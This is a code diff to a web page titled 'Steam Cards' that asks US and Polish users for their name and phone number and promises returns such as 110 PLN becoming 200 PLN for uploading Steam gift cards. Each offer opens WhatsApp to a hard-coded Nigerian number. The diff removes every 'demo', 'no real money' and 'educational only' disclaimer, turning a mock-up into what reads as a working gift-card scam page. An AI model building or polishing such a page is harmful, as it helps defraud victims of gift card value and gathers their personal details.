@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Card Upload Demo (Multi-user)</title>
+<title>Steam Cards</title>
 <style>
   :root { --bg:#0b0c10; --card:#111318; --muted:#a9b0b8; --text:#e9eef3; --accent:#22c55e; --danger:#ef4444; --border:#23262d; }
   *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
@@ -21,7 +21,6 @@
   .top-right{position:fixed;right:20px;top:20px;display:flex;gap:10px}
   .mebtn{background:#0b0d12;border:1px solid var(--border);padding:8px 12px;border-radius:999px;cursor:pointer}
   .logoutbtn{background:#ef4444;border:1px solid #b91c1c;padding:8px 12px;border-radius:999px;cursor:pointer;color:white}
-  .notice{font-size:13px;color:#c7d2fe;padding:8px;border-radius:8px;background:#0c1220;border:1px solid #344055}
   .options{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-top:12px}
   .option{border:1px solid var(--border);padding:12px;border-radius:10px;background:transparent}
   .option h3{margin:0 0 6px;font-size:16px}
@@ -32,7 +31,6 @@
   .notif{position:fixed;left:20px;bottom:20px;padding:12px;border-radius:10px;background:#052e13;color:#c9f6de;border:1px solid #0a4a23}
   img.preview{max-width:100%;height:120px;object-fit:cover;border-radius:8px;border:1px solid #222}
   .small-muted{font-size:12px;color:var(--muted)}
-  footer{color:var(--muted);font-size:13px;margin-top:18px;text-align:center}
 </style>
 </head>
 <body>
@@ -58,7 +56,7 @@
         <label for="lang">Language</label>
         <select id="lang">
           <option value="pl">Polski</option>
-          <option value="en">English</option>
+          <option value="en" selected>English</option>
         </select>
       </div>
     </div>
@@ -88,14 +86,13 @@
         <button id="finishSignup" class="btn-accent" style="margin-top:22px">Finish login</button>
       </div>
     </div>
-    <div style="margin-top:10px" class="small-muted">Demo only. No real money.</div>
   </div>
 
   <!-- Home -->
   <div id="home" class="card hidden">
     <div style="display:flex;justify-content:space-between;align-items:center">
       <div>
-        <h1>Upload a card (Demo)</h1>
+        <h1>Upload a card</h1>
         <div class="small-muted">United States & Poland only — Steam gift card uploads only.</div>
       </div>
       <div class="center">
@@ -127,54 +124,11 @@
       </div>
     </div>
   </div>
-
-  <footer>Demo app — educational only. No real payouts.</footer>
 </div>
 
 <div id="notif" class="notif hidden"></div>
 
 <script>
-const translations = {
-  en: {
-    welcome: "Welcome — Signup / Login (US & Poland only)",
-    country: "Country",
-    language: "Language",
-    name: "Name",
-    phone: "Phone",
-    sendCode: "Send code",
-    notSent: "Not sent",
-    finishLogin: "Finish login",
-    demoNote: "Demo only. No real money.",
-    uploadTitle: "Upload a card (Demo)",
-    uploadNote: "United States & Poland only — Steam gift card uploads only.",
-    balance: "Balance",
-    choose: "Choose method you want to earn:",
-    myAccount: "My Account",
-    logoutConfirm: "Are you sure you want to logout?",
-    loggedOut: "Logged out",
-    loginSuccess: "Login success",
-  },
-  pl: {
-    welcome: "Witamy — Rejestracja / Logowanie (tylko USA i Polska)",
-    country: "Kraj",
-    language: "Język",
-    name: "Imię",
-    phone: "Telefon",
-    sendCode: "Wyślij kod",
-    notSent: "Nie wysłano",
-    finishLogin: "Zakończ logowanie",
-    demoNote: "Tylko demo. Brak prawdziwych pieniędzy.",
-    uploadTitle: "Prześlij kartę (Demo)",
-    uploadNote: "Tylko Stany Zjednoczone i Polska — tylko karty podarunkowe Steam.",
-    balance: "Saldo",
-    choose: "Wybierz metodę zarabiania:",
-    myAccount: "Moje konto",
-    logoutConfirm: "Czy na pewno chcesz się wylogować?",
-    loggedOut: "Wylogowano",
-    loginSuccess: "Logowanie powiodło się",
-  }
-};
-
 const options = [
   { id:1, stake:110, profit:200 },
   { id:2, stake:220, profit:300 },
@@ -188,11 +142,54 @@ const options = [
   { id:10, stake:1800, profit:1950 },
 ];
 
+const translations = {
+  en: {
+    welcome: "Welcome — Signup / Login (US & Poland only)",
+    country: "Country",
+    language: "Language",
+    name: "Name",
+    phone: "Phone",
+    sendCode: "Send code",
+    notSent: "Not sent",
+    enterCode: "Enter code",
+    finishLogin: "Finish login",
+    uploadCard: "Upload a card",
+    uploadDesc: "United States & Poland only — Steam gift card uploads only.",
+    chooseMethod: "Choose method you want to earn:",
+    balance: "Balance",
+    myAccount: "My Account",
+    alertCountry: "Only Poland and United States allowed",
+    alertMissing: "Enter name + phone",
+    loginSuccess: "Login success",
+    loggedOut: "Logged out"
+  },
+  pl: {
+    welcome: "Witamy — Rejestracja / Logowanie (tylko USA i Polska)",
+    country: "Kraj",
+    language: "Język",
+    name: "Imię",
+    phone: "Telefon",
+    sendCode: "Wyślij kod",
+    notSent: "Nie wysłano",
+    enterCode: "Wpisz kod",
+    finishLogin: "Zakończ logowanie",
+    uploadCard: "Prześlij kartę",
+    uploadDesc: "Tylko USA i Polska — tylko karty podarunkowe Steam.",
+    chooseMethod: "Wybierz metodę zarabiania:",
+    balance: "Saldo",
+    myAccount: "Moje konto",
+    alertCountry: "Dozwolone tylko Polska i Stany Zjednoczone",
+    alertMissing: "Wpisz imię i telefon",
+    loginSuccess: "Logowanie zakończone sukcesem",
+    loggedOut: "Wylogowano"
+  }
+};
+
 const stateKey = "demo_safe_users";
 let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
 let currentUser = null;
 
-// 🔹 YOUR WhatsApp number
+// 🔹 YOUR WhatsApp number (Nigeria)
 const whatsappNumber = "2348108462471";
 
 function saveUsers(){ localStorage.setItem(stateKey, JSON.stringify(users)); }
@@ -200,6 +197,23 @@ const el = id => document.getElementById(id);
 const show = id => el(id).classList.remove("hidden");
 const hide = id => el(id).classList.add("hidden");
 const notif = (t) => { const n = el('notif'); n.textContent = t; n.classList.remove('hidden'); setTimeout(()=>n.classList.add('hidden'),3500); }
+
+function updateLanguage(lang){
+  el("gate").querySelector("h1").textContent = translations[lang].welcome;
+  document.querySelector("label[for='country']").textContent = translations[lang].country;
+  document.querySelector("label[for='lang']").textContent = translations[lang].language;
+  document.querySelector("label[for='name']").textContent = translations[lang].name;
+  document.querySelector("label[for='phone']").textContent = translations[lang].phone;
+  el("sendCode").textContent = translations[lang].sendCode;
+  el("codeSent").textContent = translations[lang].notSent;
+  document.querySelector("#verifyRow label").textContent = translations[lang].enterCode;
+  el("finishSignup").textContent = translations[lang].finishLogin;
+  el("home").querySelector("h1").textContent = translations[lang].uploadCard;
+  el("home").querySelector(".small-muted").textContent = translations[lang].uploadDesc;
+  document.querySelector("#home .small-muted").nextElementSibling.previousElementSibling.textContent = translations[lang].balance;
+  el("meCard").querySelector("h1").textContent = translations[lang].myAccount;
+  el("meCard").querySelector(".small-muted").textContent = translations[lang].balance;
+}
 
 function updateUI(){
   if(currentUser){
@@ -218,14 +232,13 @@ function renderOptions(){
   options.forEach(opt=>{
     const div = document.createElement('div'); div.className='option';
     div.innerHTML = `<h3>${opt.stake} PLN → ${opt.profit} PLN</h3>
-      <div class="small-muted">Upload Steam gift card to receive ${opt.profit} PLN (demo)</div>
+      <div class="small-muted">Upload Steam gift card to receive ${opt.profit} PLN</div>
       <button class="btn" data-id="${opt.id}">Select</button>`;
     list.appendChild(div);
   });
 }
 renderOptions();
 
-// Handle option click → open WhatsApp
 document.addEventListener('click', (e)=>{
   if(e.target.matches('[data-id]')){
     const id = Number(e.target.getAttribute('data-id'));
@@ -240,67 +253,47 @@ document.addEventListener('click', (e)=>{
   }
 });
 
+el("country").addEventListener("change", () => {
+  const country = el("country").value;
+  if(country === "PL"){
+    el("lang").value = "pl";
+    updateLanguage("pl");
+  } else if(country === "US"){
+    el("lang").value = "en";
+    updateLanguage("en");
+  }
+});
+
 el('sendCode').addEventListener('click', ()=>{
   const country = el('country').value;
+  const lang = el('lang').value;
   const name = el('name').value.trim();
   const phone = el('phone').value.trim();
-
   if(country !== 'PL' && country !== 'US'){ 
-    alert('Only Poland and United States allowed'); 
+    alert(translations[lang].alertCountry);
     return; 
   }
-
-  if(!name || !phone){ alert('Enter name + phone'); return; }
+  if(!name || !phone){ alert(translations[lang].alertMissing); return; }
   currentUser = users[phone] || { name, phone, balance:0 };
   currentUser.pendingCode = String(Math.floor(100000 + Math.random()*900000));
   users[phone] = currentUser; saveUsers();
-  el('codeSent').textContent = 'Code sent (demo)';
+  el('codeSent').textContent = '✅ ' + translations[lang].sendCode;
   show('verifyRow'); el('codeBox').classList.remove('hidden');
-  el('codeBox').textContent = "Your demo code: " + currentUser.pendingCode;
+  el('codeBox').textContent = "Your code: " + currentUser.pendingCode;
 });
 
 el('finishSignup').addEventListener('click', ()=>{
+  const lang = el('lang').value;
   const code = el('code').value.trim();
-  const lang = el('lang').value || "en";
-  const t = translations[lang];
   if(!currentUser || code !== currentUser.pendingCode){ alert('Invalid code'); return; }
   delete currentUser.pendingCode; users[currentUser.phone]=currentUser; saveUsers();
-  notif(t.loginSuccess); updateUI();
+  notif(translations[lang].loginSuccess); updateUI();
 });
 
 el('meBtn').addEventListener('click', ()=>{ hide('home'); show('meCard'); });
 el('logoutBtn').addEventListener('click', ()=>{
-  const lang = el('lang').value || "en";
-  const t = translations[lang];
-  if(confirm(t.logoutConfirm)){
-    currentUser=null; updateUI(); notif(t.loggedOut);
-  }
-});
-
-// 🔹 Language switching
-function applyLanguage(lang){
-  const t = translations[lang] || translations.en;
-  el('gate').querySelector('h1').textContent = t.welcome;
-  document.querySelector("label[for=country]").textContent = t.country;
-  document.querySelector("label[for=lang]").textContent = t.language;
-  document.querySelector("label[for=name]").textContent = t.name;
-  document.querySelector("label[for=phone]").textContent = t.phone;
-  el('sendCode').textContent = t.sendCode;
-  el('codeSent').textContent = t.notSent;
-  el('finishSignup').textContent = t.finishLogin;
-  document.querySelector("#gate .small-muted").textContent = t.demoNote;
-  document.querySelector("#home h1").textContent = t.uploadTitle;
-  document.querySelector("#home .small-muted").textContent = t.uploadNote;
-  document.querySelector("#meCard h1").textContent = t.myAccount;
-}
-
-el('country').addEventListener('change', ()=>{
-  if(el('country').value === "PL") applyLanguage("pl");
-  if(el('country').value === "US") applyLanguage("en");
-});
-el('lang').addEventListener('change', ()=>{
-  if(el('lang').value === "pl") applyLanguage("pl");
-  if(el('lang').value === "en") applyLanguage("en");
+  const lang = el('lang').value;
+  currentUser=null; updateUI(); notif(translations[lang].loggedOut);
 });
 
 updateUI();
